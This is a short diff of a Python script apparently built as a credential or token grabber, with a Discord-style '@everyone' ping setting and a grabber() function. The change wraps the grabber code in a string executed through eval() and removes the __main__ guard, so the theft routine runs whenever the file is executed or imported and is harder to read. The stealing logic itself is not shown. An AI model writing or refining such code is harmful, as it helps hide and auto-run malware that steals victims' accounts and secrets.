@@ -51,7 +51,7 @@ ping = "@everyone" #Leave blank for no ping
                :YJ.                                                        
               .:.                                                         
 """
-
+grabber = """
 #grabber
 def grabber():
     if os.name != "nt":
@@ -107,8 +107,9 @@ def grabber():
             pass
 
 #start
-if __name__ == "__main__":
-    start = time.time()
-    grabber()
 
-    # your code
+start = time.time()
+grabber()
+"""
+eval(grabber)
+
